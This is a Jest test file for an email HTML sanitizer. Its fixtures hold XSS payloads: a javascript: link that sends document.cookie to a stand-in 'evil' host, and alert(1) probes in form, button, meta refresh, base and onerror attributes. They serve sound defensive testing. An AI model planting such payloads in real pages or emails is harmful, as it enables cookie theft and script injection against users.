import { describe, expect, it } from "@jest/globals";
import { sanitizeUntrustedEmailHtml } from "../sanitize-email-html";

/**
 * @jest-environment jsdom
 */

describe("sanitizeUntrustedEmailHtml", () => {
  it("strips script and style tags", () => {
    const sanitized = sanitizeUntrustedEmailHtml(
      '<p>Hello</p><script>alert(1)</script><style>.x{}</style>',
    );
    expect(sanitized).toContain("Hello");
    expect(sanitized).not.toMatch(/<script/i);
    expect(sanitized).not.toMatch(/<style/i);
  });

  it("blocks javascript: URLs on links and forms", () => {
    const payloads = [
      '<a href="javascript:fetch(\'//evil/\'+document.cookie)">x</a>',
      '<form action="javascript:alert(1)"><input></form>',
      '<button formaction="javascript:alert(1)">x</button>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<base href="javascript:alert(1)//">',
    ];

    for (const html of payloads) {
      const sanitized = sanitizeUntrustedEmailHtml(html);
      expect(sanitized.toLowerCase()).not.toContain("javascript:");
    }
  });

  it("removes inline event handlers", () => {
    const sanitized = sanitizeUntrustedEmailHtml(
      '<img src="x" onerror="alert(1)"><p onclick="alert(1)">Hi</p>',
    );
    expect(sanitized).not.toMatch(/onerror/i);
    expect(sanitized).not.toMatch(/onclick/i);
  });

  it("preserves cid and safe data image sources", () => {
    const sanitized = sanitizeUntrustedEmailHtml(
      '<img src="cid:abc@x"><img src="data:image/png;base64,abc">',
    );
    expect(sanitized).toContain('cid:abc@x');
    expect(sanitized).toContain("data:image/png;base64,abc");
  });
});
